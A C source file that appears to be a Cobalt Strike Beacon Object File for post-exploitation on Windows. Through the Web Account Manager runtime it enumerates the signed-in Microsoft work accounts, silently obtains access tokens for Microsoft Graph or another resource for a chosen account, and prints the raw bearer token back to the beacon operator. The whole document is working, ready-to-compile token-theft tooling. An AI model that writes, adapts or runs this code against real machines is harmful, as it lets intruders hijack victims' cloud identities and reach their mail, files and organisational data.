#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "beacon_min.h"

typedef void *HSTRING;

typedef struct AbiObject {
    void **vtable;
} AbiObject;

DECLSPEC_IMPORT HRESULT WINAPI COMBASE$RoInitialize(UINT32 init_type);
DECLSPEC_IMPORT void WINAPI COMBASE$RoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$RoGetActivationFactory(HSTRING class_id, const GUID *iid, void **factory);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$WindowsCreateString(const wchar_t *source, UINT32 length, HSTRING *string);
DECLSPEC_IMPORT HRESULT WINAPI COMBASE$WindowsDeleteString(HSTRING string);
DECLSPEC_IMPORT const wchar_t *WINAPI COMBASE$WindowsGetStringRawBuffer(HSTRING string, UINT32 *length);

DECLSPEC_IMPORT ULONGLONG WINAPI KERNEL32$GetTickCount64(void);
DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(DWORD milliseconds);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT void *WINAPI KERNEL32$HeapAlloc(HANDLE heap, DWORD flags, SIZE_T bytes);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE heap, DWORD flags, void *memory);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT code_page, DWORD flags, const char *source,
                                                       int source_length, wchar_t *destination,
                                                       int destination_length);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT code_page, DWORD flags, const wchar_t *source,
                                                       int source_length, char *destination,
                                                       int destination_length, const char *default_char,
                                                       BOOL *used_default_char);
DECLSPEC_IMPORT int WINAPI KERNEL32$CompareStringOrdinal(const wchar_t *left, int left_length,
                                                        const wchar_t *right, int right_length,
                                                        BOOL ignore_case);

static const GUID IID_ASYNC_INFO =
    {0x00000036, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
static const GUID IID_WAM_STATICS =
    {0x6aca7c92, 0xa581, 0x4479, {0x9c, 0x10, 0x75, 0x2e, 0xff, 0x44, 0xfd, 0x34}};
static const GUID IID_REQUEST_FACTORY =
    {0x6cf2141c, 0x0ff0, 0x4c67, {0xb8, 0x4f, 0x99, 0xdd, 0xbe, 0x4a, 0x72, 0xc9}};
static const GUID IID_WAM_STATICS4 =
    {0x54e633fe, 0x96e0, 0x41e8, {0x98, 0x32, 0x12, 0x98, 0x89, 0x7c, 0x2a, 0xaf}};
static const GUID IID_WEB_ACCOUNT2 =
    {0x7b56d6f8, 0x990b, 0x4eb5, {0x94, 0xa7, 0x56, 0x21, 0xf3, 0xa8, 0xb8, 0x24}};

static const wchar_t DEFAULT_CLIENT_ID[] = L"1fec8e78-bce4-4aaf-ab1b-5451cc387264";
static const wchar_t DEFAULT_SCOPE[] = L"https://graph.microsoft.com/.default";
static const wchar_t DEFAULT_AUTHORITY[] = L"organizations";
static const wchar_t PROVIDER_ID[] = L"https://login.microsoft.com";
static const wchar_t MANAGER_CLASS[] = L"Windows.Security.Authentication.Web.Core.WebAuthenticationCoreManager";
static const wchar_t REQUEST_CLASS[] = L"Windows.Security.Authentication.Web.Core.WebTokenRequest";
static const wchar_t RESERVED_SCOPES[] = L" openid offline_access profile";
static const wchar_t CAE_CLAIMS[] = L"{\"access_token\":{\"xms_cc\":{\"values\":[\"cp1\"]}}}";

typedef HRESULT (WINAPI *QueryInterfaceFn)(AbiObject *, const GUID *, void **);
typedef ULONG (WINAPI *ReleaseFn)(AbiObject *);
typedef HRESULT (WINAPI *AsyncStatusFn)(AbiObject *, int *);
typedef HRESULT (WINAPI *AsyncErrorFn)(AbiObject *, HRESULT *);
typedef HRESULT (WINAPI *AsyncCancelFn)(AbiObject *);
typedef HRESULT (WINAPI *ProviderLookupFn)(AbiObject *, HSTRING, HSTRING, AbiObject **);
typedef HRESULT (WINAPI *SilentTokenFn)(AbiObject *, AbiObject *, AbiObject **);
typedef HRESULT (WINAPI *SilentTokenWithAccountFn)(AbiObject *, AbiObject *, AbiObject *, AbiObject **);
typedef HRESULT (WINAPI *FindAccountFn)(AbiObject *, AbiObject *, HSTRING, AbiObject **);
typedef HRESULT (WINAPI *FindAllAccountsFn)(AbiObject *, AbiObject *, HSTRING, AbiObject **);
typedef HRESULT (WINAPI *GetResultsFn)(AbiObject *, AbiObject **);
typedef HRESULT (WINAPI *CreateRequestFn)(AbiObject *, AbiObject *, HSTRING, HSTRING, int, AbiObject **);
typedef HRESULT (WINAPI *GetObjectFn)(AbiObject *, AbiObject **);
typedef HRESULT (WINAPI *MapInsertFn)(AbiObject *, HSTRING, HSTRING, BYTE *);
typedef HRESULT (WINAPI *GetStatusFn)(AbiObject *, int *);
typedef HRESULT (WINAPI *GetUintFn)(AbiObject *, UINT32 *);
typedef HRESULT (WINAPI *VectorGetAtFn)(AbiObject *, UINT32, AbiObject **);
typedef HRESULT (WINAPI *GetStringFn)(AbiObject *, HSTRING *);

static HANDLE process_heap(void)
{
    return KERNEL32$GetProcessHeap();
}

static void *heap_alloc(SIZE_T bytes)
{
    return KERNEL32$HeapAlloc(process_heap(), 0, bytes);
}

static void heap_free(void *memory)
{
    if (memory != NULL) {
        KERNEL32$HeapFree(process_heap(), 0, memory);
    }
}

static SIZE_T wide_length(const wchar_t *value)
{
    const wchar_t *cursor = value;
    while (*cursor != L'\0') {
        ++cursor;
    }
    return (SIZE_T)(cursor - value);
}

static wchar_t *utf8_to_wide(const char *value)
{
    int count;
    wchar_t *result;
    if (value == NULL) {
        return NULL;
    }
    count = KERNEL32$MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, value, -1, NULL, 0);
    if (count <= 0) {
        return NULL;
    }
    result = (wchar_t *)heap_alloc((SIZE_T)count * sizeof(wchar_t));
    if (result == NULL) {
        return NULL;
    }
    if (KERNEL32$MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, value, -1, result, count) != count) {
        heap_free(result);
        return NULL;
    }
    return result;
}

static char *wide_to_utf8(const wchar_t *value, int length)
{
    int count;
    char *result;
    if (value == NULL) return NULL;
    count = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, value, length, NULL, 0, NULL, NULL);
    if (count == 0 && length != 0) return NULL;
    result = (char *)heap_alloc((SIZE_T)count + 1);
    if (result == NULL) return NULL;
    if (count != 0 && KERNEL32$WideCharToMultiByte(
            CP_UTF8, 0, value, length, result, count, NULL, NULL) != count) {
        heap_free(result);
        return NULL;
    }
    result[count] = '\0';
    return result;
}

static wchar_t *compose_scope(const wchar_t *requested)
{
    SIZE_T requested_length = wide_length(requested);
    SIZE_T reserved_length = wide_length(RESERVED_SCOPES);
    SIZE_T i;
    wchar_t *result;
    if (requested_length > 4000 || requested_length + reserved_length + 1 < requested_length) {
        return NULL;
    }
    result = (wchar_t *)heap_alloc((requested_length + reserved_length + 1) * sizeof(wchar_t));
    if (result == NULL) {
        return NULL;
    }
    for (i = 0; i < requested_length; ++i) result[i] = requested[i];
    for (i = 0; i < reserved_length; ++i) result[requested_length + i] = RESERVED_SCOPES[i];
    result[requested_length + reserved_length] = L'\0';
    return result;
}

static HRESULT make_hstring(const wchar_t *value, HSTRING *result)
{
    SIZE_T length = wide_length(value);
    if (length > 0xffffffffu) return E_INVALIDARG;
    return COMBASE$WindowsCreateString(value, (UINT32)length, result);
}

static HRESULT abi_query(AbiObject *object, const GUID *iid, void **result)
{
    return ((QueryInterfaceFn)object->vtable[0])(object, iid, result);
}

static void abi_release(AbiObject *object)
{
    if (object != NULL) {
        ((ReleaseFn)object->vtable[2])(object);
    }
}

static HRESULT wait_async(AbiObject *operation, DWORD timeout_ms)
{
    AbiObject *info = NULL;
    ULONGLONG started = KERNEL32$GetTickCount64();
    HRESULT hr = abi_query(operation, &IID_ASYNC_INFO, (void **)&info);
    if (FAILED(hr)) return hr;

    for (;;) {
        int status = 0;
        hr = ((AsyncStatusFn)info->vtable[7])(info, &status);
        if (FAILED(hr)) break;
        if (status == 1) {
            hr = S_OK;
            break;
        }
        if (status == 2) {
            hr = HRESULT_FROM_WIN32(ERROR_CANCELLED);
            break;
        }
        if (status == 3) {
            hr = E_FAIL;
            ((AsyncErrorFn)info->vtable[8])(info, &hr);
            break;
        }
        if (KERNEL32$GetTickCount64() - started >= timeout_ms) {
            ((AsyncCancelFn)info->vtable[9])(info);
            hr = HRESULT_FROM_WIN32(WAIT_TIMEOUT);
            break;
        }
        KERNEL32$Sleep(25);
    }
    abi_release(info);
    return hr;
}

static HRESULT insert_property(AbiObject *map, const wchar_t *key, const wchar_t *value)
{
    HSTRING hkey = NULL;
    HSTRING hvalue = NULL;
    BYTE replaced = FALSE;
    HRESULT hr = make_hstring(key, &hkey);
    if (SUCCEEDED(hr)) hr = make_hstring(value, &hvalue);
    if (SUCCEEDED(hr)) hr = ((MapInsertFn)map->vtable[10])(map, hkey, hvalue, &replaced);
    COMBASE$WindowsDeleteString(hvalue);
    COMBASE$WindowsDeleteString(hkey);
    return hr;
}

static int claims_has_object_root(const wchar_t *claims)
{
    const wchar_t *start = claims;
    const wchar_t *end = claims + wide_length(claims);
    while (*start == L' ' || *start == L'\t' || *start == L'\r' || *start == L'\n') ++start;
    while (end > start && (end[-1] == L' ' || end[-1] == L'\t' || end[-1] == L'\r' || end[-1] == L'\n')) --end;
    return end > start && *start == L'{' && end[-1] == L'}';
}

static HRESULT get_account_strings(AbiObject *account, HSTRING *id, HSTRING *username, int *state)
{
    AbiObject *account2 = NULL;
    HRESULT hr = ((GetStringFn)account->vtable[7])(account, username);
    if (SUCCEEDED(hr)) hr = ((GetStatusFn)account->vtable[8])(account, state);
    if (SUCCEEDED(hr)) hr = abi_query(account, &IID_WEB_ACCOUNT2, (void **)&account2);
    if (SUCCEEDED(hr)) hr = ((GetStringFn)account2->vtable[6])(account2, id);
    abi_release(account2);
    return hr;
}

static const char *account_state_name(int state)
{
    if (state == 0) return "None";
    if (state == 1) return "Connected";
    if (state == 2) return "Error";
    return "Unknown";
}

static HRESULT print_account(AbiObject *account, UINT32 index, int include_index)
{
    HSTRING id = NULL, username = NULL;
    UINT32 id_length = 0, username_length = 0;
    const wchar_t *id_wide, *username_wide;
    char *id_utf8 = NULL, *username_utf8 = NULL;
    int state = 0;
    HRESULT hr = get_account_strings(account, &id, &username, &state);
    if (FAILED(hr)) goto cleanup;
    id_wide = COMBASE$WindowsGetStringRawBuffer(id, &id_length);
    username_wide = COMBASE$WindowsGetStringRawBuffer(username, &username_length);
    id_utf8 = wide_to_utf8(id_wide, (int)id_length);
    username_utf8 = wide_to_utf8(username_wide, (int)username_length);
    if (id_utf8 == NULL || username_utf8 == NULL) {
        hr = E_OUTOFMEMORY;
        goto cleanup;
    }
    if (include_index) {
        BeaconPrintf(CALLBACK_OUTPUT, "[%u] username=%s accountId=%s state=%s",
                     index, username_utf8, id_utf8, account_state_name(state));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "account username=%s accountId=%s state=%s",
                     username_utf8, id_utf8, account_state_name(state));
    }
cleanup:
    heap_free(username_utf8);
    heap_free(id_utf8);
    COMBASE$WindowsDeleteString(username);
    COMBASE$WindowsDeleteString(id);
    return hr;
}

static void report_provider_error(AbiObject *result)
{
    AbiObject *error = NULL;
    UINT32 code = 0;
    if (SUCCEEDED(((GetObjectFn)result->vtable[8])(result, &error)) && error != NULL) {
        ((GetUintFn)error->vtable[6])(error, &code);
        BeaconPrintf(CALLBACK_ERROR, "WAM provider error: 0x%08x", code);
    }
    abi_release(error);
}

static int acquire(const wchar_t *client_id, const wchar_t *requested_scope,
                   const wchar_t *resource, const wchar_t *authority, const wchar_t *claims,
                   const wchar_t *account_id, const wchar_t *username,
                   DWORD timeout_ms, int hide_token, int enumerate_accounts)
{
    HRESULT hr = S_OK;
    int result_code = 40;
    wchar_t *full_scope = NULL;
    HSTRING manager_class = NULL, request_class = NULL, provider_id = NULL;
    HSTRING authority_string = NULL, scope_string = NULL, client_id_string = NULL;
    HSTRING token = NULL, account_id_string = NULL;
    AbiObject *statics = NULL, *statics4 = NULL, *factory = NULL, *provider_operation = NULL;
    AbiObject *provider = NULL, *request = NULL, *properties = NULL;
    AbiObject *token_operation = NULL, *result = NULL, *responses = NULL, *response = NULL;
    AbiObject *account_operation = NULL, *accounts_operation = NULL, *accounts_result = NULL;
    AbiObject *accounts = NULL, *selected_account = NULL;

#define CHECK(call) do { hr = (call); if (FAILED(hr)) goto cleanup; } while (0)

    if (resource == NULL) {
        full_scope = compose_scope(requested_scope);
        if (full_scope == NULL) {
            hr = E_OUTOFMEMORY;
            goto cleanup;
        }
    }
    CHECK(make_hstring(MANAGER_CLASS, &manager_class));
    CHECK(COMBASE$RoGetActivationFactory(manager_class, &IID_WAM_STATICS, (void **)&statics));
    CHECK(make_hstring(PROVIDER_ID, &provider_id));
    CHECK(make_hstring(authority, &authority_string));
    CHECK(((ProviderLookupFn)statics->vtable[12])(
        statics, provider_id, authority_string, &provider_operation));
    CHECK(wait_async(provider_operation, timeout_ms));
    CHECK(((GetResultsFn)provider_operation->vtable[8])(provider_operation, &provider));
    if (provider == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "WAM account provider is unavailable");
        result_code = 30;
        goto cleanup;
    }

    CHECK(make_hstring(client_id, &client_id_string));

    if (enumerate_accounts || username != NULL) {
        UINT32 count = 0, index, matches = 0;
        int account_status = 0;
        CHECK(abi_query(statics, &IID_WAM_STATICS4, (void **)&statics4));
        CHECK(((FindAllAccountsFn)statics4->vtable[7])(
            statics4, provider, client_id_string, &accounts_operation));
        CHECK(wait_async(accounts_operation, timeout_ms));
        CHECK(((GetResultsFn)accounts_operation->vtable[8])(accounts_operation, &accounts_result));
        CHECK(((GetStatusFn)accounts_result->vtable[7])(accounts_result, &account_status));
        if (account_status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "WAM account enumeration status: %d", account_status);
            result_code = 31;
            goto cleanup;
        }
        CHECK(((GetObjectFn)accounts_result->vtable[6])(accounts_result, &accounts));
        CHECK(((GetUintFn)accounts->vtable[7])(accounts, &count));

        if (enumerate_accounts) {
            BeaconPrintf(CALLBACK_OUTPUT, "WAM accounts: %u", count);
            for (index = 0; index < count; ++index) {
                AbiObject *account = NULL;
                CHECK(((VectorGetAtFn)accounts->vtable[6])(accounts, index, &account));
                hr = print_account(account, index, 1);
                abi_release(account);
                if (FAILED(hr)) goto cleanup;
            }
            result_code = 0;
            goto cleanup;
        }

        for (index = 0; index < count; ++index) {
            AbiObject *account = NULL;
            HSTRING candidate_username = NULL;
            const wchar_t *candidate_text;
            CHECK(((VectorGetAtFn)accounts->vtable[6])(accounts, index, &account));
            hr = ((GetStringFn)account->vtable[7])(account, &candidate_username);
            if (FAILED(hr)) {
                abi_release(account);
                goto cleanup;
            }
            candidate_text = COMBASE$WindowsGetStringRawBuffer(candidate_username, NULL);
            if (KERNEL32$CompareStringOrdinal(candidate_text, -1, username, -1, TRUE) == CSTR_EQUAL) {
                ++matches;
                if (selected_account == NULL) selected_account = account;
                else abi_release(account);
            } else {
                abi_release(account);
            }
            COMBASE$WindowsDeleteString(candidate_username);
        }
        if (matches != 1) {
            BeaconPrintf(CALLBACK_ERROR, "%s: matchCount=%u",
                         matches == 0 ? "account_not_found" : "account_ambiguous", matches);
            result_code = matches == 0 ? 33 : 34;
            goto cleanup;
        }
    } else if (account_id != NULL) {
        CHECK(make_hstring(account_id, &account_id_string));
        CHECK(((FindAccountFn)statics->vtable[10])(
            statics, provider, account_id_string, &account_operation));
        CHECK(wait_async(account_operation, timeout_ms));
        CHECK(((GetResultsFn)account_operation->vtable[8])(account_operation, &selected_account));
        if (selected_account == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "account_not_found");
            result_code = 33;
            goto cleanup;
        }
    }

    CHECK(make_hstring(REQUEST_CLASS, &request_class));
    CHECK(COMBASE$RoGetActivationFactory(request_class, &IID_REQUEST_FACTORY, (void **)&factory));
    CHECK(make_hstring(resource == NULL ? full_scope : L"", &scope_string));
    CHECK(((CreateRequestFn)factory->vtable[7])(
        factory, provider, scope_string, client_id_string, 0, &request));
    CHECK(((GetObjectFn)request->vtable[10])(request, &properties));
    if (resource != NULL) {
        CHECK(insert_property(properties, L"resource", resource));
    } else {
        CHECK(insert_property(properties, L"wam_compat", L"2.0"));
    }
    if (claims != NULL) CHECK(insert_property(properties, L"claims", claims));

    if (selected_account == NULL) {
        CHECK(((SilentTokenFn)statics->vtable[6])(statics, request, &token_operation));
    } else {
        CHECK(((SilentTokenWithAccountFn)statics->vtable[7])(
            statics, request, selected_account, &token_operation));
    }
    CHECK(wait_async(token_operation, timeout_ms));
    CHECK(((GetResultsFn)token_operation->vtable[8])(token_operation, &result));
    {
        int status = 0;
        CHECK(((GetStatusFn)result->vtable[7])(result, &status));
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "WAM token request status: %d", status);
            report_provider_error(result);
            result_code = (status == 3) ? 20 : 32;
            goto cleanup;
        }
    }

    CHECK(((GetObjectFn)result->vtable[6])(result, &responses));
    {
        UINT32 count = 0;
        CHECK(((GetUintFn)responses->vtable[7])(responses, &count));
        if (count == 0) {
            hr = E_UNEXPECTED;
            goto cleanup;
        }
    }
    CHECK(((VectorGetAtFn)responses->vtable[6])(responses, 0, &response));
    CHECK(((GetStringFn)response->vtable[6])(response, &token));
    {
        AbiObject *response_account = NULL;
        UINT32 token_length = 0;
        const wchar_t *token_text = COMBASE$WindowsGetStringRawBuffer(token, &token_length);
        BeaconPrintf(CALLBACK_OUTPUT, "WAM success: requestMode=%s tokenLength=%u claimsRequested=%s",
                     resource == NULL ? "scope" : "resource",
                     token_length, claims == NULL ? "false" : "true");
        if (!hide_token) {
            UINT32 i;
            char *ascii_token = (char *)heap_alloc((SIZE_T)token_length + 1);
            if (ascii_token == NULL) {
                hr = E_OUTOFMEMORY;
                goto cleanup;
            }
            for (i = 0; i < token_length; ++i) {
                if (token_text[i] > 0x7f) {
                    heap_free(ascii_token);
                    hr = E_UNEXPECTED;
                    goto cleanup;
                }
                ascii_token[i] = (char)token_text[i];
            }
            ascii_token[token_length] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, " accessToken= %s ", ascii_token);
            heap_free(ascii_token);
        }
        if (SUCCEEDED(((GetObjectFn)response->vtable[8])(response, &response_account)) &&
            response_account != NULL) {
            hr = print_account(response_account, 0, 0);
            abi_release(response_account);
            if (FAILED(hr)) goto cleanup;
        }
    }
    result_code = 0;

cleanup:
    if (FAILED(hr) && result_code == 40) {
        BeaconPrintf(CALLBACK_ERROR, "WAM runtime error: 0x%08x", (UINT32)hr);
    }
    COMBASE$WindowsDeleteString(token);
    abi_release(response);
    abi_release(responses);
    abi_release(result);
    abi_release(token_operation);
    abi_release(properties);
    abi_release(request);
    abi_release(factory);
    COMBASE$WindowsDeleteString(client_id_string);
    COMBASE$WindowsDeleteString(account_id_string);
    COMBASE$WindowsDeleteString(scope_string);
    COMBASE$WindowsDeleteString(request_class);
    abi_release(provider);
    abi_release(accounts);
    abi_release(accounts_result);
    abi_release(accounts_operation);
    abi_release(selected_account);
    abi_release(account_operation);
    abi_release(provider_operation);
    abi_release(statics4);
    COMBASE$WindowsDeleteString(authority_string);
    COMBASE$WindowsDeleteString(provider_id);
    abi_release(statics);
    COMBASE$WindowsDeleteString(manager_class);
    heap_free(full_scope);
    return result_code;

#undef CHECK
}

void go(char *args, int length)
{
    datap parser;
    char *client_arg = NULL, *scope_arg = NULL, *resource_arg = NULL, *authority_arg = NULL, *claims_arg = NULL;
    char *account_id_arg = NULL, *username_arg = NULL;
    wchar_t *client_alloc = NULL, *scope_alloc = NULL, *resource_alloc = NULL, *authority_alloc = NULL, *claims_alloc = NULL;
    wchar_t *account_id_alloc = NULL, *username_alloc = NULL;
    const wchar_t *client_id = DEFAULT_CLIENT_ID;
    const wchar_t *scope = DEFAULT_SCOPE;
    const wchar_t *resource = NULL;
    const wchar_t *authority = DEFAULT_AUTHORITY;
    const wchar_t *claims = NULL;
    const wchar_t *account_id = NULL;
    const wchar_t *username = NULL;
    int timeout_seconds = 30;
    int hide_token = 0;
    int cae = 0;
    int enumerate_accounts = 0;
    HRESULT init_hr;

    if (args != NULL && length > 0) {
        BeaconDataParse(&parser, args, length);
        client_arg = BeaconDataExtract(&parser, NULL);
        scope_arg = BeaconDataExtract(&parser, NULL);
        resource_arg = BeaconDataExtract(&parser, NULL);
        authority_arg = BeaconDataExtract(&parser, NULL);
        claims_arg = BeaconDataExtract(&parser, NULL);
        account_id_arg = BeaconDataExtract(&parser, NULL);
        username_arg = BeaconDataExtract(&parser, NULL);
        timeout_seconds = BeaconDataInt(&parser);
        hide_token = BeaconDataInt(&parser);
        cae = BeaconDataInt(&parser);
        enumerate_accounts = BeaconDataInt(&parser);
    }

    if (timeout_seconds < 1 || timeout_seconds > 300) {
        BeaconPrintf(CALLBACK_ERROR, "timeout must be between 1 and 300 seconds");
        return;
    }
    if (client_arg != NULL && client_arg[0] != '\0') {
        client_alloc = utf8_to_wide(client_arg);
        if (client_alloc == NULL) goto conversion_error;
        client_id = client_alloc;
    }
    if (scope_arg != NULL && scope_arg[0] != '\0') {
        scope_alloc = utf8_to_wide(scope_arg);
        if (scope_alloc == NULL) goto conversion_error;
        scope = scope_alloc;
    }
    if (resource_arg != NULL && resource_arg[0] != '\0') {
        resource_alloc = utf8_to_wide(resource_arg);
        if (resource_alloc == NULL) goto conversion_error;
        resource = resource_alloc;
    }
    if (authority_arg != NULL && authority_arg[0] != '\0') {
        authority_alloc = utf8_to_wide(authority_arg);
        if (authority_alloc == NULL) goto conversion_error;
        authority = authority_alloc;
    }
    if (claims_arg != NULL && claims_arg[0] != '\0') {
        claims_alloc = utf8_to_wide(claims_arg);
        if (claims_alloc == NULL) goto conversion_error;
        claims = claims_alloc;
    }
    if (account_id_arg != NULL && account_id_arg[0] != '\0') {
        account_id_alloc = utf8_to_wide(account_id_arg);
        if (account_id_alloc == NULL) goto conversion_error;
        account_id = account_id_alloc;
    }
    if (username_arg != NULL && username_arg[0] != '\0') {
        username_alloc = utf8_to_wide(username_arg);
        if (username_alloc == NULL) goto conversion_error;
        username = username_alloc;
    }
    if (cae) {
        if (claims != NULL) {
            BeaconPrintf(CALLBACK_ERROR, "use either --cae or --claims-json, not both");
            goto cleanup;
        }
        claims = CAE_CLAIMS;
    }
    if (claims != NULL && !claims_has_object_root(claims)) {
        BeaconPrintf(CALLBACK_ERROR, "claims JSON must have an object root");
        goto cleanup;
    }
    if (scope_arg != NULL && scope_arg[0] != '\0' && resource != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "use either --scope or --resource, not both");
        goto cleanup;
    }
    if (account_id != NULL && username != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "use either --account-id or --username, not both");
        goto cleanup;
    }
    if (enumerate_accounts && (account_id != NULL || username != NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "--enum cannot be combined with an account selector");
        goto cleanup;
    }

    init_hr = COMBASE$RoInitialize(1);
    if (FAILED(init_hr) && init_hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "RoInitialize failed: 0x%08x", (UINT32)init_hr);
        goto cleanup;
    }
    acquire(client_id, scope, resource, authority, claims, account_id, username,
            (DWORD)timeout_seconds * 1000, hide_token, enumerate_accounts);
    if (init_hr != RPC_E_CHANGED_MODE) COMBASE$RoUninitialize();
    goto cleanup;

conversion_error:
    BeaconPrintf(CALLBACK_ERROR, "argument is not valid UTF-8 or memory allocation failed");

cleanup:
    heap_free(username_alloc);
    heap_free(account_id_alloc);
    heap_free(claims_alloc);
    heap_free(authority_alloc);
    heap_free(resource_alloc);
    heap_free(scope_alloc);
    heap_free(client_alloc);
}
